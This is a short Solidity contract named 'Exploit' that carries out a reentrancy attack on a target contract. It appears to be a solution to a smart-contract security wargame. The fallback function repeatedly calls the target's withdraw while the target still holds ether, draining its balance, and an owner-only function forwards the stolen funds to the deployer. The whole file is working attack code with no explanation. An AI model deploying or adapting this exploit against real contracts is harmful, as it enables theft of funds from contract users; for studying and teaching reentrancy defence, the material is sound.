// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function withdraw(uint) external;
    function balanceOf(address) external view returns (uint);
}

contract Exploit {
    address public owner;
    IReentrance public Reentrance;
    uint public withdrawnBalance = 0.001 ether;

    event CallEvent(bool);

    constructor(address _address) {
        owner = msg.sender;
        Reentrance = IReentrance(_address);
    }

    fallback() external payable {
        if (address(Reentrance).balance > 0) {
            attack(withdrawnBalance);
        }
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function attack(uint balance) public {
        withdrawnBalance = balance;
        Reentrance.withdraw(balance);
    }

    function withdraw() onlyOwner public {
        payable(owner).transfer(address(this).balance);
    }
}
